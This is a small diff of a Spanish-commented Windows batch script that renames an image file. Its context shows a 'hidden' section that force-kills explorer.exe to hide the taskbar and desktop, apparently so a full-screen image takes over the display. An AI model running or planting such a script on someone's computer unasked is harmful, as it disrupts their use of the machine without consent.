@@ -10,7 +10,7 @@ exit
 
 :hidden
 :: Ruta de la imagen (¡Cámbiala por la tuya!)
-set img="imagen.jpg"
+set img="image.jpg"
 
 :: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
 taskkill /f /im explorer.exe
